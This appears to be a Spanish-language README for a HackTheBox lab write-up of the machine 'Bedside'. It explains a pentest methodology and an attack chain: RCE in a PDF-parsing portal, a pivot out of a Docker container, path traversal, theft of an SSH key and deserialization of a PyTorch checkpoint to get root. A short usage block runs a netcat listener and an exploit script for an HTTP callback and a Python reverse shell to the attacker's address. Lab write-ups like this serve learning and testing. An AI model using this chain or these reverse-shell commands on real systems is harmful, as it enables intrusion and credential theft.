# HTB — Bedside · Write-up razonado

> Documentación de la resolución de la máquina **Bedside** (HackTheBox), escrita no como un simple
> listado de comandos, sino explicando **la lógica de cada decisión**: por qué hago cada paso,
> qué hipótesis manejo, cómo interpreto cada resultado y por qué elijo el siguiente movimiento.
> El objetivo es que se entienda el *razonamiento de un pentester*, no solo el resultado.

- **Máquina:** Bedside
- **Plataforma:** HackTheBox (entorno de laboratorio autorizado)
- **Dominio:** `bedside.htb` · vhost: `research.bedside.htb`

> ⚠️ **La IP cambia al resetear la máquina.** No hay IP fija en este README a propósito. Antes de
> cada sesión, actualiza `/etc/hosts` con la IP actual:
> ```bash
> # sustituye 10.129.X.Y por la IP que te dé HTB
> echo "10.129.X.Y  bedside.htb research.bedside.htb" | sudo tee -a /etc/hosts
> ```

> ⚠️ **Máquina ACTIVA:** publicar write-ups de máquinas activas viola las reglas de HTB. Mantener
> este repo **privado** hasta que Bedside pase a *retired*.

---

## 🧠 Metodología: cómo pienso un pentest

Antes de los detalles técnicos, el marco mental que sigo. Toda la resolución respeta este bucle:

```
   ┌─────────────────────────────────────────────────────────────┐
   │  1. RECON      ¿Qué existe? (puertos, servicios, dominios)    │
   │  2. ENUMERAR   ¿Qué hace cada cosa? (tecnologías, rutas)      │
   │  3. HIPÓTESIS  ¿Dónde puede fallar? (superficie de ataque)    │
   │  4. PROBAR     Validar/descartar la hipótesis con el mínimo    │
   │                payload posible                                 │
   │  5. EXPLOTAR   Convertir el fallo en acceso                    │
   │  6. PIVOTAR    Repetir el bucle desde la nueva posición       │
   └─────────────────────────────────────────────────────────────┘
```

**Principios que aplico en cada fase:**

1. **De lo ancho a lo estrecho (funnel).** Primero una visión amplia y barata (¿qué puertos hay?),
   luego profundizo solo donde hay señal.
2. **Cada resultado es una pregunta nueva.** Un puerto abierto no es un fin; es "¿qué corre ahí?".
3. **El mínimo payload que confirma/descarta.** Para probar una idea uso lo más pequeño posible.
4. **Observar efectos secundarios.** No solo si "funciona"; *dónde* aterriza el archivo, *qué
   cabeceras* devuelve, *qué mensaje* da. Ahí están las pistas.
5. **Separar problemas.** "¿Ejecuto código?" y "¿me vuelve la shell?" son preguntas distintas; se
   confirman por separado (ver Fase 05).

---

## 🎭 Los tres actos de la máquina

| Acto | Qué consigo | Fases |
|---|---|---|
| **1 — Foothold** | RCE en el portal `research` (pdfminer.six) → shell **dentro de un contenedor Docker** | 01–05 |
| **2 — Container → host (user)** | Desde el contenedor alcanzo el host (`172.17.0.1:3000`) → path traversal (`--path-as-is`) = lectura de ficheros del host → clave SSH de `developer` → SSH al host → `user.txt` | 06–07 |
| **3 — Root** | `sudo -l` permite correr como root un script de entrenamiento que carga un checkpoint PyTorch/MONAI → deserialización (misma *bug class*) → checkpoint malicioso → `root.txt` | 08 |

---

## 🗺️ Índice de fases

| Fase | Título | Estado |
|---|---|---|
| [00](phases/phase-00-setup.md) | Preparación del entorno (VPN, herramientas, diccionarios) | ✅ |
| [01](phases/phase-01-recon.md) | Reconocimiento de red (escaneo de puertos) | ✅ |
| [02](phases/phase-02-web-enum.md) | Enumeración web + descubrimiento del virtual host | ✅ |
| [03](phases/phase-03-vhost-research.md) | Análisis del portal `research` (subida de archivos) | ✅ |
| [04](phases/phase-04-upload-analysis.md) | Análisis del filtro de subida y superficie de ataque | ✅ |
| [05](phases/phase-05-exploitation.md) | **Explotación → RCE → shell en el contenedor** (CVE-2025-64512) | ✅ |
| [06](phases/phase-06-container-enum-pivot.md) | Dentro del contenedor: enumeración y pivot al host (puerto 3000) | ✅ |
| [07](phases/phase-07-host-file-read.md) | Path traversal en el 3000 → lectura de ficheros del host (`/etc/passwd`) | ⏳ |
| 08 | Clave SSH de `developer` → SSH al host → `user.txt` | ⬜ |
| 09 | Escalada a root vía checkpoint PyTorch/MONAI (deserialización) | ⬜ |

---

## 📂 Estructura del repositorio

| Carpeta | Contenido |
|---|---|
| `phases/` | Una ficha por fase: objetivo, razonamiento, comando, resultado e interpretación |
| `exploit/poc/` | El PoC del foothold (`exploit.py`, con modos `callback` y `pyshell`) |
| `scripts/` | Scripts/comandos reutilizables de cada fase |
| `scans/` | Salidas crudas de las herramientas (nmap, etc.) |

### El PoC del foothold (resumen)
```bash
cd exploit/poc
# 1) confirmar ejecución (callback HTTP a tu VPS)
python3 -m http.server 8000 &
python3 exploit.py --mode callback --lhost 10.10.14.95

# 2) reverse shell en Python puro (fiable sin bash en el contenedor)
nc -lvnp 4444 &
python3 exploit.py --mode pyshell --lhost 10.10.14.95 --lport 4444
```

---

## ⚙️ Entorno de trabajo

- **Atacante:** VPS Linux (Ubuntu) conectado a la VPN de HTB vía OpenVPN (`tun0 = 10.10.14.95`).
- **Herramientas:** nmap, ffuf, gobuster, curl, requests (en venv), impacket, netexec.
- **Diccionarios:** SecLists (subdominios, directorios, ffuf).
